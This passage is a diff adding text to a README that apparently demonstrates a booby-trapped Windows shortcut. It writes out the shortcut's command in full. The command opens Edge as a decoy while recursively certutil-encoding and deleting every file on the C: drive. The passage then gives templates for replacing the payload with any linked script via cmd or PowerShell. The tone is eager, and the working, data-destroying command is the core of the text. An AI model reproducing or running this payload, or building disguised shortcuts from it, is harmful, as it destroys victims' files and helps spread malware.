@@ -20,6 +20,39 @@ And this in the Windows file system:
 
 It's not until you look closer that you see what it can really do:
 
+![alt text](https://github.com/Destroyer7s/DangerFiles/blob/main/shell%20by%20properties/Shortcutcode.png)
+
+When you execute the shortcut, the following command is run:
+
+```bash
+C:\Windows\System32\cmd.exe /k "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" && cd c:\ && forfiles /S /M * /c "cmd /c certutil -encode -f @file @fname.l && findstr /v CER @fname.l > @fname.d && del @file && del @fname.l"
+```
+It can be seperated to view each command seperatly:
+
+```bash
+C:\Windows\System32\cmd.exe /k "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" && 
+cd c:\ && 
+forfiles /S /M * /c "cmd /c certutil -encode -f @file @fname.l && findstr /v CER @fname.l > @fname.d && del @file && del @fname.l"
+```
+This command allows edge to launch while encripting your files in the background. And this is only the begining!
+
+we can change the script that run to be anything we want:
+
+```bash
+C:\Windows\System32\cmd.exe /k "ENTER_LINK_HERE"
+```
+Or just:
+
+```bash
+powershell start ENTER_LINK_HERE
+```
+
+
+
+How are we able to achieve this? Through the way Windows treats shortcut files. Here we see where the payload is stored:
+
+
+
 
 
 
